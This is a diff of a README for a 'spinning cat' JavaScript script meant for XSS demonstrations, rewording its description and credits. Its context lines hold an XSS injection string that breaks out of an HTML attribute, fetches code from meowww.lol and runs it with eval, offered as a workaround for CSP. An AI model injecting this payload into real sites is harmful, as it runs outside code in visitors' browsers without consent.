@@ -2,17 +2,17 @@
 
 ![Spinning Cat](https://raw.githubusercontent.com/orlyjamie/spinningcat/refs/heads/main/cat.gif)
 
-This repository contains a chaotic JavaScript script that:
+This repository contains a (reskinned) chaotic JavaScript script that:
 - Plays an audio file of a cat song.  
 - Spawns spinning cat GIFs all over the page.  
 - Flashes a neon green screen intermittently (warning).  
 - Makes all elements on the page spin.  
 
-Perfect for XSS demonstrations or just to prank your friends!
+Perfect for those handy XSS demonstrations, or just to vibe to in your free time!
 
 ---
 
-## 🚀 Usage
+## Usage
 
 ### 1. Direct Link
 You can directly embed the script using this URL:
@@ -28,7 +28,7 @@ If external scripts are blocked by CSP, try this:
 "><script>fetch('https://meowww.lol/cat.js').then(r=>r.text()).then(eval)</script>
 ```
 
-# 💬 Contact
+# Originally created by 
 https://x.com/theonejvo
 
 https://www.linkedin.com/in/theonejvo/
